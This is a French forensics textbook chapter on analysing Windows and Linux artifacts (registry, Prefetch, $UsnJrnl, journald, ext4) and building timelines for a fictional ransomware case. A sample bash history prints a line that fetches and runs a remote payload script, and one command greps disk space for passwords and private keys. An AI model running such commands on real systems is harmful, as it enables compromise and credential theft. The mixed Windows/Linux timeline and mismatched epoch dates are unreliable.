% ============================================================================
% Fichier  : partie4/P04_C14_forensique_systeme.tex
% Titre    : Forensique Système Avancée
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Sources  : Ch. 9 (acquisition -- ce chapitre approfondit l'analyse post-
%            acquisition), affaires MBONGO/MVOM/ONAMBELE, Ch. PIU (E9bis)
% Positionnement : Ch. 9 a couvert ACQUISITION (write blocker, FTK Imager,
%                  formats E01). Ce chapitre couvre l'ANALYSE -- ce que l'on
%                  fait de l'image E01 et du dump RAM une fois acquis :
%                  artefacts Windows (registre, prefetch, $MFT), artefacts
%                  Linux (journaux, ext4), reconstruction de timeline.
%                  Premier chapitre de la Partie IV (techniques avancées).
% ============================================================================

\chapter{Forensique Système Avancée}
\label{chap:for-sys}

\epigraph{%
    « Les systèmes d'exploitation sont les témoins silencieux de nos
    actions numériques. Savoir les interroger, c'est maîtriser l'art
    de faire parler le silence. »%
}{--- Adapté de la pratique forensique}

\niveauChapitre{Expert}{%
    Maîtrise des Chapitres~\ref{chap:PIU} à~\ref{chap:acq} (Partie~II)
    indispensable. Notions de systèmes d'exploitation Windows et Linux
    (systèmes de fichiers, registre, processus) requises.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Analyser les artefacts Windows post-acquisition~: registre,
          Prefetch, ShimCache, Amcache, journal \texttt{\$MFT}.
    \item Reconstruire une timeline d'activité système à partir de
          sources hétérogènes (logs, métadonnées de fichiers, registre).
    \item Analyser les artefacts Linux~: journaux \texttt{systemd},
          historique bash, structures \texttt{ext4} et inodes.
    \item Distinguer ce qui survit à une suppression de fichier de ce
          qui disparaît, et comprendre pourquoi (Locard numérique).
    \item Appliquer la distinction Examination/Analysis (NIST~SP~800-86)
          à l'analyse système.
    \item Construire une timeline forensique avec Autopsy/log2timeline
          et l'interpréter dans le respect du principe de falsification
          (E9bis PIU).
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Ce chapitre dans la séquence du cours}
% ============================================================================

Le Chapitre~\ref{chap:acq} vous a appris à \textbf{acquérir}~: créer
une image E01, capturer la RAM, extraire un téléphone. Ce chapitre vous
apprend à \textbf{analyser} ce que vous avez acquis. La question change~:
non plus ``comment obtenir des données sans les altérer'', mais
``que disent ces données, et comment le prouver''.

\separateur

% ============================================================================
\section{Le Principe de Locard Appliqué au Système}
\label{sec:locard-systeme}
% ============================================================================

Le principe de Locard (Chapitre~\ref{chap:fond-theo})~--- ``tout contact
laisse une trace''~--- se traduit, dans un système d'exploitation, par
une multiplication d'artefacts redondants. Une seule action utilisateur
laisse souvent \textbf{cinq à dix traces indépendantes}, dans des
emplacements différents, avec des granularités temporelles différentes.

\begin{boxdef}
\textbf{Redondance forensique}\index{redondance forensique}~: propriété
selon laquelle une même action système produit plusieurs artefacts
indépendants. La redondance est la meilleure amie de l'investigateur~:
si un artefact est supprimé ou falsifié, les autres subsistent et
révèlent l'incohérence.
\end{boxdef}

\textbf{Exemple~: exécution d'un fichier \texttt{malware.exe} sur Windows}~:

\begin{tableaucours}{p{3.0cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Artefact} &
    \tableauHeader{Information capturée} &
    \tableauHeader{Survit à la suppression du fichier~?}
}
Prefetch (\texttt{.pf}) & Nom, chemin, nombre d'exécutions, dernière
    exécution, fichiers chargés &
    \textbf{Oui} --- fichier séparé dans \texttt{C:\textbackslash Windows\textbackslash Prefetch} \\
ShimCache (AppCompatCache) & Chemin, taille, horodatage de dernière
    modification, présence d'exécution &
    \textbf{Oui} --- clé de registre, persiste après suppression \\
Amcache.hve & Hash SHA-1 du binaire, chemin, premier horodatage
    d'exécution &
    \textbf{Oui} --- ruche de registre séparée \\
\texttt{\$MFT} (NTFS) & Métadonnées du fichier~: création, modification,
    accès, taille &
    \textbf{Partiellement} --- l'entrée MFT peut être réutilisée
    mais le \texttt{\$LogFile} en garde trace \\
Journal des événements
    (Event~ID~4688) & Création de processus, utilisateur, ligne
    de commande &
    \textbf{Oui} --- fichier \texttt{.evtx} séparé \\
USN Journal (\texttt{\$UsnJrnl}) & Historique des modifications du
    volume (création, suppression, renommage) &
    \textbf{Oui} --- journal continu, rotation sur volume \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~14.1 --- Redondance forensique~:
6~artefacts pour une seule exécution}\end{center}

\begin{boxCRO}
\textbf{Analyse CRO --- Redondance et opposabilité}

$\mathcal{R}$ (Fiabilité)~: la convergence de 6~artefacts indépendants
vers la même conclusion (``\texttt{malware.exe} a été exécuté le
13/03/2026 à 02h17'') constitue une preuve bien plus robuste qu'un
seul artefact, même solide.

$\mathcal{O}$ (Opposabilité)~: un avocat peut contester un artefact
isolé (``ce Prefetch pourrait dater d'un test antérieur''). Il ne
peut pas contester la convergence de 6~sources indépendantes sans
expliquer comment elles ont \emph{toutes} été falsifiées de façon
cohérente~--- ce qui est techniquement très difficile.

\cro{$\sim$}{$\uparrow\uparrow$ convergence multi-sources}{$\uparrow\uparrow$ incontestable en pratique}

\textbf{Règle pratique~:} ne jamais conclure sur la base d'un seul
artefact si d'autres sont accessibles. Documenter systématiquement
la convergence (ou la divergence, qui est elle-même une information).
\end{boxCRO}

% ============================================================================
\section{Artefacts Windows~: Registre et Exécution de Programmes}
\label{sec:artefacts-windows}
% ============================================================================

\subsection{Les ruches de registre essentielles}

Le \termecle{registre Windows}\index{registre Windows} est une base de
données hiérarchique stockant la configuration du système et des
applications. Cinq ruches sont systématiquement analysées en forensique~:

\begin{tableaucours}{p{2.5cm}p{3.0cm}p{6.0cm}}{%
    \tableauHeader{Ruche} &
    \tableauHeader{Emplacement disque} &
    \tableauHeader{Contenu forensique}
}
\texttt{SYSTEM} & \texttt{C:\textbackslash Windows\textbackslash System32\textbackslash config} &
    Configuration système, services, périphériques USB connectés
    (\texttt{USBSTOR}), fuseau horaire \\
\texttt{SOFTWARE} & idem &
    Applications installées, versions, ShimCache (AppCompatCache) \\
\texttt{SAM} & idem &
    Comptes utilisateurs locaux, hash NTLM, dernière connexion \\
\texttt{NTUSER.DAT} & \texttt{C:\textbackslash Users\textbackslash <user>} &
    Historique d'exécution (\texttt{RunMRU}), fichiers récents
    (\texttt{RecentDocs}), répertoires tapés (\texttt{TypedPaths}) \\
\texttt{Amcache.hve} & \texttt{C:\textbackslash Windows\textbackslash AppCompat\textbackslash Programs} &
    Inventaire d'applications exécutées avec hash SHA-1 \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~14.2 --- Ruches de registre essentielles}\end{center}

\subsection{Extraction et analyse avec RegRipper}

\begin{boxoutils}{RegRipper --- extraction des ruches de registre}
\begin{lstlisting}[language=bash_forensique]
# Extraire les ruches depuis l'image montee (lecture seule)
# Image montee sous /mnt/evidence/

# Lister les programmes installes
rip.pl -r /mnt/evidence/Windows/System32/config/SOFTWARE
    -p installedsoftware

# Historique des executions via UserAssist (NTUSER.DAT)
rip.pl -r /mnt/evidence/Users/MBONGO/NTUSER.DAT -p userassist
# Resultat type :
# \Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist
#   {chemin}\enc_all.ps1  -- Run Count: 1
#   LastExecuted: 2026-03-13 02:17:42

# Peripheriques USB connectes (historique complet)
rip.pl -r /mnt/evidence/Windows/System32/config/SYSTEM -p usbstor
# Resultat type :
# DeviceClass: Disk
# FriendlyName: Kingston DataTraveler 16GB
# Serial: 0123456789ABCDEF
# FirstConnect: 2026-03-10 09:15:22
# LastConnect: 2026-03-13 02:05:11

# ShimCache (AppCompatCache) -- preuve d'execution
rip.pl -r /mnt/evidence/Windows/System32/config/SYSTEM -p shimcache
# Resultat type :
# Path: C:\Users\admin\AppData\Local\Temp\enc_all.ps1
# Last Modified: 2026-03-13 02:16:58
# Executed: TRUE
\end{lstlisting}
\end{boxoutils}

\begin{boxscenario}{Reconstitution UserAssist --- cas MVOM}
Dans l'Opération MVOM (Chapitre~\ref{chap:gr-affaires}), l'analyse
UserAssist de la ruche \texttt{NTUSER.DAT} de l'administrateur
TRANSBOIS révèle~:

\begin{lstlisting}[language=bash_forensique]
UserAssist Key: {CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}
  powershell.exe          Run Count: 1   Last: 2026-03-13 02:17:40
  cmd.exe                 Run Count: 1   Last: 2026-03-13 02:17:42
  AnyDesk.exe             Run Count: 3   Last: 2026-03-13 02:10:15
\end{lstlisting}

\textbf{Constatation (sans interprétation)~:} L'application
\texttt{AnyDesk.exe} (logiciel de bureau à distance) a été exécutée
3~fois, la dernière à 02h10. \texttt{cmd.exe} a été exécuté à 02h17.
L'ordre chronologique place l'établissement d'un accès distant
\emph{avant} l'exécution des commandes suspectes.\\[0.3ex]
Cette constatation, croisée avec \texttt{windows.netscan} (Volatility,
Ch.~\ref{chap:acq}) qui montre une connexion \texttt{ESTABLISHED} vers
le port~4444 à 02h17, \textbf{converge} vers une chronologie cohérente~:
accès distant établi~$\to$ ouverture d'un shell~$\to$ déploiement
du ransomware.
\end{boxscenario}

\subsection{Le Prefetch~: preuve d'exécution même sans logs}

Le \termecle{Prefetch}\index{Prefetch} est un mécanisme d'optimisation
Windows qui enregistre, pour chaque exécutable lancé, un fichier
\texttt{.pf} dans \texttt{C:\textbackslash Windows\textbackslash Prefetch}.
Ces fichiers survivent souvent à la suppression de l'exécutable lui-même.

\begin{boxoutils}{Analyse Prefetch avec PECmd}
\begin{lstlisting}[language=bash_forensique]
# PECmd (Eric Zimmerman tools) -- analyse complete du repertoire Prefetch
PECmd.exe -d /mnt/evidence/Windows/Prefetch --csv ./output/

# Resultat (extrait CSV) :
# SourceFilename       : ENC_ALL.PS1-3F8A2B91.pf
# ExecutableName       : enc_all.ps1
# RunCount             : 1
# LastRun              : 2026-03-13 02:17:44
# Volume0Created       : 2024-01-15 10:00:00
# FilesAccessed        : C:\Windows\System32\WindowsPowerShell\...
#                        C:\Users\admin\AppData\Local\Temp\enc_all.ps1
#                        C:\Users\Public\Documents\encrypted_files_list.txt
\end{lstlisting}
\textbf{Valeur forensique~:} même si \texttt{enc\_all.ps1} a été supprimé
par l'attaquant après exécution, le fichier Prefetch
\texttt{ENC\_ALL.PS1-3F8A2B91.pf} subsiste et révèle~: le nom exact du
script, son horodatage d'exécution (02h17:44, cohérent avec UserAssist
et Volatility), et la liste des fichiers accédés~--- y compris
\texttt{encrypted\_files\_list.txt}, preuve directe de l'activité ransomware.
\end{boxoutils}

% ============================================================================
\section{Le Système de Fichiers NTFS~: \texttt{\$MFT} et \texttt{\$UsnJrnl}}
\label{sec:ntfs}
% ============================================================================

\subsection{La Master File Table}

La \termecle{\$MFT}\index{\$MFT} (\textit{Master File Table}) est la
structure centrale de NTFS~: chaque fichier et répertoire y possède une
entrée de 1024~octets contenant ses métadonnées. Quatre horodatages
(\textbf{MACE}) sont enregistrés pour chaque fichier~:

\begin{tableaucours}{p{2.0cm}p{3.0cm}p{6.5cm}}{%
    \tableauHeader{Timestamp} &
    \tableauHeader{Signification} &
    \tableauHeader{Piège forensique fréquent}
}
\textbf{M} --- Modified & Dernière modification du contenu &
    Modifié par toute écriture, même mineure~; ne reflète pas
    la création \\
\textbf{A} --- Accessed & Dernier accès en lecture &
    \textbf{Souvent désactivé} depuis Windows~Vista
    (\texttt{NtfsDisableLastAccessUpdate=1})~; ne pas s'y fier
    sans vérification \\
\textbf{C} --- Changed (MFT) & Dernière modification de
    l'\emph{entrée MFT} elle-même (métadonnées, permissions) &
    Différent de Modified~! Un renommage modifie C sans modifier M \\
\textbf{E} --- Entry created/Birth & Création de l'entrée MFT &
    Peut différer de la date de création réelle du fichier
    si copié depuis un autre volume \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~14.3 --- Les quatre horodatages MACE de NTFS}\end{center}

\begin{boxalert}
\textbf{``Timestomping''~: la manipulation des horodatages}

Des outils comme \texttt{timestomp} permettent à un attaquant de
modifier artificiellement les 4~horodatages MACE d'un fichier pour
le faire ``apparaître'' plus ancien et échapper à la timeline.

\textbf{Détection~:} le \texttt{\$UsnJrnl} (section suivante) et le
\texttt{\$LogFile} (journal de transactions NTFS) enregistrent les
\emph{changements} d'horodatages indépendamment des valeurs MACE
elles-mêmes. Une entrée \texttt{\$MFT} affichant une date de création
``2020'' alors que le \texttt{\$UsnJrnl} montre une création le
``13/03/2026'' révèle un timestomping. \textbf{Toujours croiser
\$MFT et \$UsnJrnl pour les fichiers suspects.}
\end{boxalert}

\subsection{Le journal USN~: l'historique immuable des changements}

Le \termecle{\$UsnJrnl}\index{\$UsnJrnl} (\textit{Update Sequence Number
Journal}) enregistre chronologiquement chaque opération sur le système
de fichiers~: création, suppression, renommage, modification.
Contrairement à la \texttt{\$MFT} qui ne montre que l'\emph{état actuel},
le \texttt{\$UsnJrnl} montre l'\emph{historique}.

\begin{boxoutils}{Extraction du \$UsnJrnl avec MFTECmd}
\begin{lstlisting}[language=bash_forensique]
# Extraction et parsing du journal USN
MFTECmd.exe -f /mnt/evidence/\$Extend/\$UsnJrnl:\$J --csv ./output/

# Resultat (extrait, chronologique) :
# Timestamp            Filename              Reason
# 2026-03-13 02:16:50  enc_all.ps1           FileCreate
# 2026-03-13 02:17:44  enc_all.ps1           DataExtend|Close
# 2026-03-13 02:18:30  enc_all.ps1           FileDelete
# 2026-03-13 02:18:31  encrypted_files_list.txt  FileCreate
# 2026-03-13 02:18:31  *.docx (x847)         DataOverwrite (chiffrement)
\end{lstlisting}
\textbf{Constatation~:} le \texttt{\$UsnJrnl} révèle la séquence
exacte~: création du script (02h16:50)~$\to$ exécution (02h17:44, cohérent
avec Prefetch/UserAssist)~$\to$ suppression du script (02h18:30, tentative
d'anti-forensique)~$\to$ chiffrement de masse (02h18:31, 847~fichiers).
\textbf{La suppression du script à 02h18:30 n'a effacé ni le Prefetch,
ni UserAssist, ni le \$UsnJrnl lui-même.}
\end{boxoutils}

% ============================================================================
\section{Artefacts Linux~: journald, bash et ext4}
\label{sec:artefacts-linux}
% ============================================================================

\subsection{Le journal systemd}

Sur les systèmes Linux modernes (Ubuntu~20.04+, Debian~11+, RHEL~8+),
\termecle{journald}\index{journald} centralise les logs système dans
un format binaire indexé.

\begin{boxoutils}{Analyse forensique de journald}
\begin{lstlisting}[language=bash_forensique]
# Analyser les journaux d'une image montee (hors-ligne)
journalctl --root=/mnt/evidence --since "2026-03-13 02:00:00" \
    --until "2026-03-13 03:00:00"

# Filtrer par service (ex : SSH)
journalctl --root=/mnt/evidence -u ssh.service

# Connexions SSH reussies / echouees
journalctl --root=/mnt/evidence | grep -i "sshd.*Accepted\|sshd.*Failed"
# Resultat type :
# Mar 13 02:14:02 srv sshd[4821]: Failed password for root from
#     185.220.XX.XX port 51234 ssh2
# Mar 13 02:14:09 srv sshd[4821]: Accepted password for root from
#     185.220.XX.XX port 51234 ssh2
# -> 7 tentatives echouees puis succes : brute-force reussi

# Commandes sudo executees
journalctl --root=/mnt/evidence | grep "sudo:.*COMMAND"
\end{lstlisting}
\end{boxoutils}

\subsection{Historique bash et fichiers de configuration shell}

\begin{boxoutils}{Artefacts shell -- bash\_history et environnement}
\begin{lstlisting}[language=bash_forensique]
# Historique des commandes (attention : tronque a HISTSIZE)
cat /mnt/evidence/root/.bash_history
cat /mnt/evidence/home/*/.bash_history

# Timestamps si HISTTIMEFORMAT etait active :
# #1678672664
# wget http://185.220.XX.XX/payload.sh
# #1678672680
# chmod +x payload.sh && ./payload.sh

# Fichiers de configuration modifies recemment (persistance)
find /mnt/evidence/etc -name "*.service" -newer \
    /mnt/evidence/etc/hostname

# Crontabs -- mecanisme de persistance frequent
cat /mnt/evidence/etc/crontab
cat /mnt/evidence/var/spool/cron/crontabs/*
ls -la /mnt/evidence/etc/cron.d/

# Cles SSH autorisees (backdoor frequente)
cat /mnt/evidence/root/.ssh/authorized_keys
cat /mnt/evidence/home/*/.ssh/authorized_keys
\end{lstlisting}
\end{boxoutils}

\begin{boiteRemarque}{bash\_history~: une preuve fragile}
Le fichier \texttt{.bash\_history} n'est écrit sur disque qu'à la
fermeture propre du shell (\texttt{exit}, ou périodiquement). Un
attaquant qui tue brutalement sa session (\texttt{kill~-9}) ou
définit \texttt{HISTSIZE=0} laisse un historique vide ou incomplet.
\textbf{Ne jamais conclure ``aucune commande exécutée'' sur la seule
absence d'historique~: croiser avec \texttt{journald},
\texttt{auditd} (si actif), et l'analyse mémoire (Volatility~3,
\texttt{linux.bash} --- récupère l'historique depuis la mémoire
même non écrit sur disque).}
\end{boiteRemarque}

\subsection{Structures ext4~: inodes et récupération}

Le système de fichiers \termecle{ext4}\index{ext4} organise chaque
fichier autour d'un \textit{inode} contenant ses métadonnées
(taille, permissions, horodatages, pointeurs vers les blocs de données).
La suppression d'un fichier sous ext4 libère l'inode et marque les blocs
comme disponibles, \textbf{sans effacer immédiatement le contenu}.

\begin{boxoutils}{Récupération de fichiers supprimés ext4 avec extundelete}
\begin{lstlisting}[language=bash_forensique]
# Lister les inodes recemment supprimes
extundelete /mnt/evidence/dev/sdb1 --inode 2

# Recuperer tous les fichiers supprimes recuperables
extundelete /mnt/evidence/dev/sdb1 --restore-all \
    -o /output/recovered/

# Alternative : debugfs pour inspection manuelle d'un inode
debugfs -R "stat <12345>" /mnt/evidence/dev/sdb1
# Affiche : Inode, Mode, taille, Links, horodatages, blocs

# Recherche de chaines dans l'espace libre (complement carving Ch. 9)
dd if=/mnt/evidence/dev/sdb1 bs=4096 skip=0 | \
    strings -n 8 | grep -i "password\|api_key\|BEGIN PRIVATE KEY"
\end{lstlisting}
\end{boxoutils}

% ============================================================================
\section{Reconstruction de Timeline Forensique}
\label{sec:timeline}
% ============================================================================

\subsection{Pourquoi une timeline unifiée}

Chaque source d'artefacts (registre, \texttt{\$MFT}, \texttt{\$UsnJrnl},
journald, logs applicatifs) produit ses propres horodatages dans des
formats différents. La \termecle{timeline forensique}\index{timeline
forensique} unifie ces sources en une chronologie unique, permettant
de \textbf{voir la séquence complète des événements} et d'identifier
les corrélations qu'aucune source isolée ne révèle.

\subsection{log2timeline / plaso}

\begin{boxoutils}{Construction d'une timeline avec log2timeline (plaso)}
\begin{lstlisting}[language=bash_forensique]
# Generer le fichier plaso (extraction brute, multi-sources)
log2timeline.py /output/timeline.plaso /mnt/evidence/

# Filtrer et exporter en CSV pour la periode d'interet
psort.py -o l2tcsv -w /output/timeline.csv /output/timeline.plaso \
    "date > '2026-03-13 02:00:00' AND date < '2026-03-13 03:00:00'"

# Exemple de timeline consolidee (extrait, toutes sources) :
# 02:14:02  journald     SSH Failed password from 185.220.XX.XX
# 02:14:09  journald     SSH Accepted password (root)
# 02:16:50  $UsnJrnl     FileCreate enc_all.ps1
# 02:17:40  UserAssist   powershell.exe executed
# 02:17:42  UserAssist   cmd.exe executed
# 02:17:44  Prefetch     enc_all.ps1 executed (RunCount=1)
# 02:17:44  $UsnJrnl     enc_all.ps1 DataExtend|Close
# 02:18:30  $UsnJrnl     enc_all.ps1 FileDelete
# 02:18:31  $UsnJrnl     encrypted_files_list.txt FileCreate
# 02:18:31  $UsnJrnl     *.docx (x847) DataOverwrite
\end{lstlisting}
\end{boxoutils}

\subsection{Lecture d'une timeline~: constatation vs interprétation}

\begin{boxscenario}{Timeline MVOM -- rédaction du rapport}
À partir de la timeline consolidée ci-dessus, voici comment rédiger
les sections \textbf{Constatations} et \textbf{Analyse} (NIST~SP~800-86,
Ch.~\ref{chap:meth-std})~:

\textbf{Constatations (faits vérifiables, non ambigus)~:}
\begin{quote}
``Le journal \texttt{journald} enregistre 7~tentatives de connexion
SSH échouées depuis l'IP \texttt{185.220.XX.XX} entre 02h13:45 et
02h14:08, suivies d'une connexion réussie au compte \texttt{root}
à 02h14:09. Le \texttt{\$UsnJrnl} enregistre la création du fichier
\texttt{enc\_all.ps1} à 02h16:50. UserAssist et Prefetch enregistrent
l'exécution de \texttt{powershell.exe}, \texttt{cmd.exe} et
\texttt{enc\_all.ps1} entre 02h17:40 et 02h17:44. Le \texttt{\$UsnJrnl}
enregistre la suppression de \texttt{enc\_all.ps1} à 02h18:30, suivie
à 02h18:31 de la création de \texttt{encrypted\_files\_list.txt} et
de la modification de 847~fichiers \texttt{.docx}.''
\end{quote}

\textbf{Analyse (interprétation, avec niveau de confiance)~:}
\begin{quote}
``La séquence temporelle ci-dessus est cohérente, \emph{avec un niveau
de confiance élevé}, avec le scénario suivant~: un accès SSH non
autorisé au compte \texttt{root} a été obtenu par force brute
(02h14)~; environ 2~minutes et 40~secondes plus tard, un script
ransomware a été déposé et exécuté (02h16--02h18)~; ce script a
chiffré 847~fichiers avant de tenter de s'auto-supprimer
(02h18:30), une technique d'anti-forensique courante qui a
échoué à effacer les traces dans le \texttt{\$UsnJrnl}, le
Prefetch et UserAssist.''
\end{quote}
\end{boxscenario}

% ============================================================================
\section{Synthèse~: Méthodologie d'Analyse Système}
\label{sec:synthese-for-sys}
% ============================================================================

\begin{tableaucours}{p{3.5cm}p{3.5cm}p{4.5cm}}{%
    \tableauHeader{Question} &
    \tableauHeader{Sources Windows} &
    \tableauHeader{Sources Linux}
}
Quel programme a été exécuté, quand~? &
    Prefetch, UserAssist, ShimCache, Amcache &
    \texttt{bash\_history}, \texttt{auditd},
    \texttt{journald} (systemd-coredump) \\
Quel fichier a été créé/modifié/supprimé, quand~? &
    \texttt{\$UsnJrnl}, \texttt{\$MFT} (MACE) &
    \texttt{debugfs}, \texttt{extundelete},
    horodatages inode \\
Un périphérique externe a-t-il été connecté~? &
    \texttt{USBSTOR} (registre SYSTEM), Event~ID~2003/2100 &
    \texttt{journald} (kernel~: \texttt{usb~new device}),
    \texttt{/var/log/syslog} \\
Une connexion réseau a-t-elle été établie~? &
    Volatility \texttt{netscan} (Ch.~\ref{chap:acq}), pare-feu &
    \texttt{journald} (sshd, NetworkManager), \texttt{auditd} \\
Les horodatages ont-ils été manipulés~? &
    Croiser \texttt{\$MFT} (MACE) et \texttt{\$UsnJrnl} &
    Croiser \texttt{stat} inode et \texttt{journald} \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~14.4 --- Méthodologie d'analyse système~:
question $\to$ sources}\end{center}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Redondance forensique}~: une action système laisse
          de multiples traces indépendantes. Toujours chercher la
          convergence entre plusieurs sources avant de conclure.

    \item \textbf{Windows~: cinq artefacts à toujours vérifier}~:
          Prefetch (preuve d'exécution), UserAssist (historique GUI),
          ShimCache/Amcache (inventaire d'exécution avec hash),
          \texttt{\$UsnJrnl} (historique des changements de fichiers).

    \item \textbf{MACE et timestomping}~: les 4~horodatages NTFS
          (Modified, Accessed, Changed, Entry-created) peuvent être
          manipulés. Le \texttt{\$UsnJrnl} et le \texttt{\$LogFile}
          révèlent les manipulations car ils enregistrent
          l'\emph{historique}, pas seulement l'\emph{état}.

    \item \textbf{Linux~: \texttt{journald} + \texttt{bash\_history}
          + crontabs + \texttt{authorized\_keys}}~: les quatre premiers
          endroits à vérifier. \texttt{bash\_history} est fragile~:
          croiser avec Volatility \texttt{linux.bash} pour l'historique
          non écrit sur disque.

    \item \textbf{ext4}~: la suppression libère l'inode sans effacer
          immédiatement les données~; \texttt{extundelete} et
          \texttt{debugfs} permettent la récupération.

    \item \textbf{Timeline unifiée (log2timeline/plaso)}~: consolide
          toutes les sources en une chronologie. La rédaction du
          rapport sépare strictement \textbf{constatations}
          (faits horodatés, vérifiables) et \textbf{analyse}
          (interprétation, avec niveau de confiance explicite ---
          NIST~SP~800-86).
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~14.1 --- Identification d'artefacts \niveaubase}]
Pour chacune des questions suivantes, identifiez l'artefact Windows
ou Linux le plus pertinent, et la commande/outil pour l'extraire~:
\begin{enumerate}[(a)]
    \item Un suspect affirme n'avoir jamais exécuté \texttt{TrueCrypt}
          sur son PC Windows~10. Comment vérifier~?
    \item Une clé USB a-t-elle été branchée sur ce PC Windows dans les
          30~derniers jours, et si oui, laquelle (numéro de série)~?
    \item Sur un serveur Linux, un fichier \texttt{/etc/shadow} a été
          modifié il y a 2~jours. Comment savoir qui l'a modifié et quand,
          précisément~?
    \item Un fichier \texttt{rapport\_confidentiel.docx} a été supprimé
          d'un disque ext4 il y a 1~heure. Quelles sont les chances de
          récupération et quel outil utiliser~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~14.2 --- Détection de timestomping \niveaumoyen}]
L'analyse \texttt{\$MFT} d'un fichier \texttt{rootkit.dll} montre~:
\begin{lstlisting}[language=bash_forensique]
Created (E):   2019-08-12 14:30:00
Modified (M):  2019-08-12 14:30:00
Accessed (A):  2019-08-12 14:30:00
Changed (C):   2019-08-12 14:30:00
\end{lstlisting}
L'analyse \texttt{\$UsnJrnl} pour le même fichier montre~:
\begin{lstlisting}[language=bash_forensique]
2026-03-13 02:19:15  rootkit.dll  FileCreate
2026-03-13 02:19:16  rootkit.dll  DataExtend|Close
\end{lstlisting}
\begin{enumerate}[(a)]
    \item Que révèle cette divergence~?
    \item Rédigez la constatation (sans interprétation) et l'analyse
          (avec interprétation et niveau de confiance) correspondantes,
          en respectant la distinction NIST~SP~800-86.
    \item Quels autres artefacts (Prefetch, UserAssist, ShimCache)
          permettraient de confirmer l'horodatage réel d'exécution~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~14.3 --- Timeline complète \niveauexpert}]
Vous disposez d'une image E01 d'un serveur Windows~Server~2022
(Opération MVOM) et d'un dump RAM associé. Le service IT signale
que le ransomware a chiffré les fichiers entre 02h15 et 02h20
le 13~mars~2026, mais ne sait pas comment l'attaquant a obtenu
l'accès initial.

\begin{enumerate}[(a)]
    \item Construisez le plan d'investigation~: dans quel ordre
          analyser quelles sources (registre, \texttt{\$MFT},
          \texttt{\$UsnJrnl}, journal des événements, RAM)~? Justifiez
          l'ordre.
    \item Pour chaque source analysée, quelle question spécifique
          cherchez-vous à répondre~?
    \item Construisez (sur la base des éléments fournis dans ce
          chapitre et au Chapitre~\ref{chap:acq}) la timeline complète
          de l'incident, de l'accès initial au chiffrement.
    \item Rédigez les sections Constatations et Analyse de votre
          rapport~: au moins 5~constatations horodatées et une
          analyse globale avec niveau de confiance explicite.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Le Chapitre~\ref{chap:for-net} (Forensique Réseau
Opérationnelle) complète ce chapitre en se concentrant sur les artefacts
\emph{réseau}~: capture et analyse approfondie de trafic, détection
d'exfiltration de données, analyse de protocoles chiffrés. Le
Chapitre~\ref{chap:anti-for} (Anti-Forensique et Contre-Mesures)
traite ensuite des techniques que les attaquants utilisent pour
échapper exactement aux analyses présentées dans ce chapitre~--- et
comment les détecter malgré tout.
\end{boxinfo}
